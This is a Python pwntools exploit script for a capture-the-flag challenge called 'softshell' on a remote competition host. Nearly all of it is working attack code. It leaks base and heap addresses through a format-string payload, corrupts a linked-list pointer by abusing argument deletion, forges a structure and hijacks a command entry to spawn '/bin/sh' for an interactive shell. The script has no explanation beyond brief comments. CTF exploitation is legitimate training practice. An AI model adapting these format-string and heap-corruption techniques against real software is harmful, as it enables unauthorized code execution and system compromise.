#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host chal.pctf.competitivecyber.club --port 8888 softshell
from pwn import *
context(aslr=False)
#context(aslr=True)

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'softshell')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'chal.pctf.competitivecyber.club'
port = int(args.PORT or 8888)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#tbreak main
heap-analysis-helper
#b *0x555555555aa4
#b *0x555555555d28
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def add_cmd(io, cmd_str, tag):
    io.sendline('1')
    io.sendline(cmd_str)
    io.recvuntil('at index ')
    index = io.recvuntil('\n')
    io.sendline(tag)
    return index

def delete_arg(io, cmd_idx):
    io.sendline('5')
    io.recvuntil('remove arg')
    io.sendline(str(cmd_idx))
    io.recvuntil('argument')

def get_tag(io, cmd_idx):
    io.sendline('2')
    io.recvuntil('view')
    io.sendline(str(cmd_idx))
    io.recvuntil('Tag: ')
    tag = io.recvuntil('\n')
    io.recvuntil('argument')
    io.sendline('0')
    io.recvuntil('argument')
    return tag[:-1]


def start_attempt():
    io = start()
    io.recvuntil('argument')

    # idx 0
    cmd = f'cmd %3$p %4$p %5$p %6$p %7$p %8$p %9$p %10$p '

    add_cmd(io, cmd[:-1], 'tag0')

    io.sendline('2')
    io.sendline('0')
    io.recvuntil('argument')
    io.sendline('8')
    io.recvuntil('0x')
    leak = io.recvuntil('\n')[:-1]
    print(f'LEAK: {leak}')
    b_addr = int(leak, 16)
    base_addr = b_addr - 0x4010
    print(f'LEAK_ADDR: {base_addr:#x}')

    io.sendline('2')
    io.sendline('0')
    io.recvuntil('argument')
    io.sendline('4')
    io.recvuntil('0x')
    leak = io.recvuntil('\n')[:-1]
    print(f'LEAK: {leak}')
    h_addr = int(leak, 16)
    heap_addr = (h_addr>>12)<<12
    print(f'HEAP_ADDR: {heap_addr:#x}')

    """
    #Every extra space increments the argument counter without actually adding an argument to the list. Lets free the pointer to the next structure in the single linked list
    """
    # idx 1
    cmd = '/bin/bash ;                   '
    add_cmd(io, cmd, 'tag')

    # idx 2
    add_cmd(io, 'cmd2 1arg0 1arg1 1arg2   ', 'T' * 28)
    # idx 3
    add_cmd(io, 'cmd2 1arg0 1arg1 1arg2   ', 'T' * 28)

    delete_arg(io, 1) #delete last argument, which points to idx1's tag, should be 28 bytes, which is what we need for the next structure

    # we now have control to the pointer to the next struct, we need to create our own fake struct
    io.sendline('4')
    io.recvuntil('run')
    io.sendline('1')
    io.recvuntil('feedback')
    io.sendline('y')
    io.recvuntil('Feedback')
    payload = p64(base_addr+0x4020)
    io.sendline(payload)

    io.recvuntil('argument')
    io.sendline('3')  # Edit the tag
    io.sendline('3')  # at idx 3
    io.recvuntil('tag')
    io.sendline('/bin/sh')
    io.recvuntil('argument')
    # idx 4
    add_cmd(io, '/bin/sh', 'tag')

    # Run command 4
    io.sendline('4')
    io.recvuntil('run')
    io.sendline('4')

    io.interactive()

#for i in range(10000):
start_attempt()
